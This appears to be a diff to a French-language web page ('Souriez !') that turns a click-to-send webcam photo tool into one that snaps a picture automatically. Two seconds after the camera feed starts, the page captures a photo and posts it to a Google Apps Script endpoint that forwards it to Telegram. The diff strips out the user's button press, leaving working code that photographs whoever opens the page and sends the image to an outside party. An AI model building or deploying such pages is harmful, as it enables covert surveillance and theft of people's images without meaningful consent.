@@ -3,65 +3,69 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>📸 Photo Cam → Telegram</title>
+<title>📸 Photo Auto → Telegram</title>
 <style>
   body { font-family: sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
   video, canvas { max-width: 90%; border-radius: 12px; margin: 10px auto; display: block; }
-  button { background: #e91e63; color: #fff; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; }
-  button:hover { background: #c2185b; }
-  #status { margin-top: 10px; color: #4fc3f7; }
+  #status { margin-top: 10px; color: #4fc3f7; font-size: 18px; }
 </style>
 </head>
 <body>
 <h1>📸 Souriez !</h1>
 <video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
-<br>
-<button id="snap">📷 Prendre la photo et l'envoyer</button>
-<div id="status"></div>
+<div id="status">En attente de la caméra...</div>
 
 <script>
 const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec";
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const snapBtn = document.getElementById('snap');
 const status = document.getElementById('status');
 
-let camPrete = false;
-
+// 1. Démarrage caméra
 navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
   .then(stream => {
     video.srcObject = stream;
-    video.onplaying = () => { camPrete = true; };
+    video.play();
   })
-  .catch(err => alert("Impossible d'accéder à la caméra : " + err.message));
+  .catch(err => { status.textContent = "❌ Caméra refusée : " + err.message; });
 
-snapBtn.addEventListener('click', () => {
-  if (!camPrete || !video.videoWidth) {
-    alert("La caméra n'est pas encore prête, réessaie dans une seconde !");
-    return;
-  }
-  requestAnimationFrame(() => requestAnimationFrame(() => {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.style.display = 'block';
-
-    const base64 = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
-    envoyerVersTelegram(base64);
-  }));
+// 2. Dès que la vidéo joue vraiment, on attend 2 sec puis photo auto + envoi
+video.addEventListener('playing', () => {
+  status.textContent = "⏳ Photo dans 2 secondes...";
+  setTimeout(prendrePhoto, 2000);
 });
 
+function prendrePhoto() {
+  if (!video.videoWidth) {
+    setTimeout(prendrePhoto, 300); // caméra pas prête, on réessaie
+    return;
+  }
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.style.display = 'block';
+
+  const base64 = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
+  status.textContent = "📤 Envoi vers Telegram...";
+  envoyerVersTelegram(base64);
+}
+
 function envoyerVersTelegram(base64Image) {
-  status.textContent = "⏳ Envoi en cours...";
   fetch(APPS_SCRIPT_URL, {
     method: "POST",
-    headers: { "Content-Type": "text/plain" }, // évite le blocage CORS des Apps Script
-    body: JSON.stringify({ image: base64Image, nom: "photo_cam_" + Date.now() + ".jpg" })
+    headers: { "Content-Type": "text/plain" },
+    body: JSON.stringify({ image: base64Image, nom: "auto_" + Date.now() + ".jpg" })
   })
   .then(r => r.text())
-  .then(txt => { status.textContent = "✅ Photo envoyée sur ton Telegram !"; console.log(txt); })
+  .then(txt => {
+    console.log("Réponse Apps Script :", txt);
+    status.textContent = txt.includes('"ok":true')
+      ? "✅ Photo envoyée sur ton Telegram !"
+      : "⚠️ Réponse inattendue : " + txt;
+  })
   .catch(err => { status.textContent = "❌ Erreur d'envoi : " + err.message; });
 }
 </script>
